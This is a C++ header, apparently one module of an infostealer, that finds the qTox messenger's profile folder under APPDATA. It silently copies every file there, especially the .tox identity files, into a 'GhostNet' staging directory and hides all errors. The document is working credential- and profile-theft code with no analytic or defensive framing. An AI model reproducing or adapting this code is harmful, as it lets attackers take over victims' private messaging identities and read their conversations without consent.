#pragma once
#ifndef QTOX_HPP
#define QTOX_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include <windows.h>

namespace fs = std::filesystem;

namespace QTox {
    inline void ExtractQToxData(const std::string& ghostNetPath) {
        // Get AppData path
        char* appData = getenv("APPDATA");
        if (!appData) return;

        std::string toxDir = std::string(appData) + "\\Tox";

        // Check if qTox is installed
        if (!fs::exists(toxDir)) return;

        // Create QTox folder in GhostNet directory
        std::string targetDir = ghostNetPath + "\\QTox";
        CreateDirectoryA(targetDir.c_str(), NULL);

        try {
            // Copy all Tox profile data
            for (const auto& entry : fs::recursive_directory_iterator(toxDir, fs::directory_options::skip_permission_denied)) {
                std::string relativePath = fs::relative(entry.path(), toxDir).string();
                std::string destPath = targetDir + "\\" + relativePath;

                if (fs::is_directory(entry)) {
                    CreateDirectoryA(destPath.c_str(), NULL);
                }
                else {
                    // Create parent directories if needed
                    fs::path destDir = fs::path(destPath).parent_path();
                    fs::create_directories(destDir);

                    // Copy file (especially .tox profile files)
                    CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
                }
            }
        }
        catch (const std::exception& e) {
            // Silently handle errors
        }
    }
}

#endif // QTOX_HPP